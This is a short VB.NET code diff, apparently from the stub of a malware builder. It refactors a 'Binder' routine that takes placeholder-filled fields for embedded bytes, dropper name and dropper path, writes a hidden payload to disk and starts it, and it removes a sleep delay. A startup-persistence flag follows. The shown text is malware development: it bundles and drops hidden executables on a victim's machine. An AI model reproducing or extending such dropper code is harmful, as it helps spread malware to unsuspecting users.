@@ -44,7 +44,6 @@ Public Class Form1
     Public BinderStatus As String = "[BinderStatus]"
     Public BinderBytes As String = "[BinderBytes]"
     Public DropperPath As String = "[DropperPath]"
-    Public BinderSleep As String = "[BinderSleep]"
     Public DropperName As String = "[DropperName]"
     Public st As Integer = 0
     Public Y As String = "|BN|"
@@ -93,11 +92,12 @@ Public Class Form1
 
             If BinderStatus = "True" Then
                 Dim Binder As New Binder
-                Binder.BinderBytes = BinderBytes
-                Binder.DropperName = DropperName
-                Binder.DropperPath = DropperPath
-                Binder.BinderSleep = BinderSleep
-                Binder.StartBinder()
+                With Binder
+                    .BinderBytes = BinderBytes
+                    .DropperName = DropperName
+                    .DropperPath = DropperPath
+                    .StartBinder()
+                End With
             End If
 
             If Startup = "True" Then
